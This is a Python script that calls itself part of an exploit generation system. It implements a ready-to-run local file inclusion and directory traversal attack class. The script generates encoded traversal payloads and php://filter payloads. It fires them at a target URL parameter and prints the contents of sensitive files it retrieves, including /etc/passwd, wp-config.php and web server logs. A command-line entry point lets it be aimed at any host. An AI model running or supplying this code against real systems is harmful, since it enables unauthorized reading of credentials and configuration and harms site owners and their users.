"""
Local File Inclusion (LFI) / File Read Exploit Class
Extracted from HexStrike exploit generation system
"""

import requests
import sys
from urllib.parse import quote


class FileReadExploit:
    """File read and directory traversal exploitation class"""

    def __init__(self, target_url):
        """
        Initialize file read exploit

        Args:
            target_url: Base URL of target application
        """
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_payloads(self, target_file="/etc/passwd"):
        """
        Generate directory traversal payloads

        Args:
            target_file: Target file path to read

        Returns:
            List of directory traversal payloads
        """
        payloads = [
            # Basic traversal
            "../" * 10 + target_file.lstrip('/'),
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",

            # URL encoded
            quote("../") * 10 + target_file.lstrip('/'),

            # Double encoding
            quote(quote("../")) * 10 + target_file.lstrip('/'),

            # Null byte (for older systems)
            "../" * 10 + target_file.lstrip('/') + "%00.txt",

            # Absolute paths
            target_file,
            "file://" + target_file,

            # Windows paths
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:/windows/system32/drivers/etc/hosts"
        ]

        return payloads

    def test_file_read(self, parameter="file"):
        """
        Test LFI vulnerability

        Args:
            parameter: Parameter name to test

        Returns:
            True if vulnerability found, False otherwise
        """
        print(f"[+] Testing LFI on parameter: {parameter}")

        # Common target files
        test_files = [
            "/etc/passwd",
            "/etc/hosts",
            "/proc/version",
            "/var/www/html/wp-config.php",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=wp-config.php"
        ]

        for target_file in test_files:
            payloads = self.generate_payloads(target_file)

            for i, payload in enumerate(payloads):
                try:
                    response = self.session.get(
                        self.target_url,
                        params={parameter: payload}
                    )

                    # Check for common file contents
                    indicators = [
                        "root:", "daemon:", "bin:", "sys:",  # /etc/passwd
                        "localhost", "127.0.0.1",  # hosts file
                        "Linux version", "Microsoft Windows",  # system info
                        "<?php", "#!/bin/"  # code files
                    ]

                    if any(indicator in response.text for indicator in indicators):
                        print(f"[+] File read successful!")
                        print(f"[+] File: {target_file}")
                        print(f"[+] Payload: {payload}")
                        print(f"[+] Content preview: {response.text[:200]}...")
                        return True

                except Exception as e:
                    continue

        return False

    def read_specific_file(self, filepath, parameter="file"):
        """
        Read a specific file using directory traversal

        Args:
            filepath: Path to file to read
            parameter: Parameter name to exploit

        Returns:
            File contents if successful, None otherwise
        """
        print(f"[+] Attempting to read: {filepath}")

        payloads = self.generate_payloads(filepath)

        for payload in payloads:
            try:
                response = self.session.get(
                    self.target_url,
                    params={parameter: payload}
                )

                if response.status_code == 200 and len(response.text) > 10:
                    print(f"[+] Successfully read {filepath}:")
                    print("-" * 50)
                    print(response.text)
                    print("-" * 50)
                    return response.text

            except Exception as e:
                continue

        print(f"[-] Could not read {filepath}")
        return None


def main():
    """Main execution function for standalone usage"""
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url> [parameter] [file_to_read]")
        print(f"Example: python3 {sys.argv[0]} http://target.com/view file /etc/passwd")
        sys.exit(1)

    target_url = sys.argv[1]
    parameter = sys.argv[2] if len(sys.argv) > 2 else "file"
    specific_file = sys.argv[3] if len(sys.argv) > 3 else None

    exploit = FileReadExploit(target_url)

    print(f"[+] File Read Exploit")
    print(f"[+] Target: {target_url}")

    if specific_file:
        exploit.read_specific_file(specific_file, parameter)
    else:
        if exploit.test_file_read(parameter):
            print("[+] File read vulnerability confirmed!")
        else:
            print("[-] No file read vulnerability found")


if __name__ == "__main__":
    main()
